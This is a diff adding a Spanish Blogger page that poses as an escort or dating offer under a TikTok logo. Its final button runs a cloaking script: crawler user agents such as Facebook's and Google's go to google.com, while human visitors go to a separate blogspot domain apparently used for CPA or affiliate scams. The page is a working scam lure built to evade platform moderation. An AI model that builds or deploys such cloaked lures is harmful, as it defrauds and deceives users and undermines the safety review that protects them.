@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html dir='ltr' lang='es'>
+<head>
+<meta content='width=device-width, initial-scale=1' name='viewport'/>
+<title>Encuentros D1scretos</title>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<!-- Chrome, Firefox OS and Opera -->
+<meta content='#ffffff' name='theme-color'/>
+<!-- Windows Phone -->
+<meta content='#ffffff' name='msapplication-navbutton-color'/>
+<meta content='blogger' name='generator'/>
+<link href='https://raciperslo.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
+<link href='https://raciperslo.blogspot.com/2025/03/document.html' rel='canonical'/>
+<link rel="alternate" type="application/atom+xml" title="el master - Atom" href="https://raciperslo.blogspot.com/feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="el master - RSS" href="https://raciperslo.blogspot.com/feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="el master - Atom" href="https://www.blogger.com/feeds/6478889293934572896/posts/default" />
+
+<link rel="alternate" type="application/atom+xml" title="el master - Atom" href="https://raciperslo.blogspot.com/feeds/8548683382487070447/comments/default" />
+<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
+<link href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXbz34jvKFNg6RFmCeb1MET1YPfLgddvGG4cLTc6JaSzgZDHrvou8rEyQM4XX1qJvAzDY6BXbLubyib04PSWYrhBGGzt-cNmtEPty7_aPzkfVMzLBC3Iof4swQbsnqdQOONuWq5FsERM6t2-WRE9JkiG9qB-euvFXbOF9LuV-rdy_hE2J4cZDZp_vpEfM/s320/6969696.png' rel='image_src'/>
+<meta content='https://raciperslo.blogspot.com/2025/03/document.html' property='og:url'/>
+<meta content='Encuentros D1scretos' property='og:title'/>
+<meta content='' property='og:description'/>
+<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXbz34jvKFNg6RFmCeb1MET1YPfLgddvGG4cLTc6JaSzgZDHrvou8rEyQM4XX1qJvAzDY6BXbLubyib04PSWYrhBGGzt-cNmtEPty7_aPzkfVMzLBC3Iof4swQbsnqdQOONuWq5FsERM6t2-WRE9JkiG9qB-euvFXbOF9LuV-rdy_hE2J4cZDZp_vpEfM/w1200-h630-p-k-no-nu/6969696.png' property='og:image'/>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  
+  <title>Encuentros D1scretos</title>
+  <meta property="og:title" content="Encuentros D1scretos">
+  <meta property="og:description" content="Haz clic para ver el catálogo disponible.">
+  <meta property="og:image" content="https://i.postimg.cc/SQVxd77J/Vista-Uno-Sepia.png">
+  <meta property="og:type" content="website">
+
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <style>
+    body, html { 
+        margin: 0; 
+        padding: 0; 
+        width: 100%; 
+        height: 100%; 
+        background-color: #000; 
+        overflow: hidden;
+        font-family: sans-serif;
+    }
+
+    /* CONTENEDOR DEL VIDEO */
+    .video-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        z-index: -1; /* Detrás de todo */
+        overflow: hidden;
+    }
+
+    #VideoBg {
+        min-width: 100%; 
+        min-height: 100%;
+        width: auto;
+        height: auto;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        object-fit: cover;
+    }
+
+    /* CAPA DE COLOR ENCIMA DEL VIDEO PARA QUE EL TEXTO RESALTE */
+    .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.4); /* Ajusta la oscuridad aquí */
+        z-index: 0;
+    }
+
+    /* ESTILOS DE LOS PASOS */
+    .content-wrap {
+        position: relative;
+        z-index: 10;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        text-align: center;
+        padding: 20px;
+    }
+
+    .step-box {
+        background: rgba(0, 0, 0, 0.7);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        padding: 30px;
+        border-radius: 20px;
+        max-width: 400px;
+        color: white;
+        backdrop-filter: blur(5px);
+    }
+
+    .btn-main {
+        display: block;
+        width: 100%;
+        padding: 15px;
+        margin: 10px 0;
+        border-radius: 10px;
+        font-weight: bold;
+        text-transform: uppercase;
+        cursor: pointer;
+        transition: 0.3s;
+        border: none;
+    }
+
+    .btn-yes { background-color: #e736a4; color: white; }
+    .btn-no { background-color: #444; color: white; }
+
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+
+  <div class="video-container">
+    <video autoplay muted loop playsinline id="VideoBg" poster="https://i.postimg.cc/SQVxd77J/Vista-Uno-Sepia.png">
+        <source src="https://cdn.videy.co/pEvKWO9U1.mp4" type="video/mp4">
+        Tu navegador no soporta video.
+    </video>
+  </div>
+  
+  <div class="overlay"></div>
+
+  <div class="content-wrap">
+    
+    <div id="step-1" class="step-box">
+        <img src="https://i.postimg.cc/kXXfxHsJ/Tik-Tok-logo-svg.png" class="w-16 mx-auto mb-4" alt="logo">
+        <h2 class="text-xl font-bold mb-4">Ofrezco mis servicios por hora, a domicilio. ¿Te gustaría ver mi catálogo?
+</h2>
+        <button class="btn-main btn-yes next-btn">SÍ, CLARO</button>
+        <button class="btn-main btn-no next-btn">NO</button>
+    </div>
+
+    <div id="step-2" class="step-box hidden">
+        <h2 class="text-xl font-bold mb-4">¡IMPORTANTE!</h2>
+        <p class="mb-4 text-sm">NOTA: ¿Aceptas respetar a las mujeres que verás a continuación? Presiona "ENTRAR" y confirma tu cita rrellenando el formulario. Si conoces a alguien, por favor no lo divulgues ni propagues rumores.</p>
+        <button id="final-redirect" class="btn-main btn-yes">ENTRAR</button>
+    </div>
+
+  </div>
+
+  <script>
+    $(document).ready(function() {
+        // 1. Forzar reproducción del video (algunos navegadores lo pausan al inicio)
+        var video = document.getElementById('VideoBg');
+        video.play().catch(function(error) {
+            console.log("El autoplay fue bloqueado, esperando interacción.");
+        });
+
+        // 2. Lógica de pasos
+        $('.next-btn').click(function() {
+            $('#step-1').fadeOut(300, function() {
+                $('#step-2').fadeIn(300);
+            });
+        });
+
+        // 3. Redirección con Filtro de Bots
+        $('#final-redirect').click(function() {
+            const isBot = /facebookexternalhit|facebot|googlebot|twitterbot/i.test(navigator.userAgent);
+            
+            if (isBot) {
+                window.location.replace("https://www.google.com");
+            } else {
+                window.location.replace("https://enmilinkcpa.blogspot.com");
+            }
+        });
+    });
+  </script>
+
+</body>
+</html>
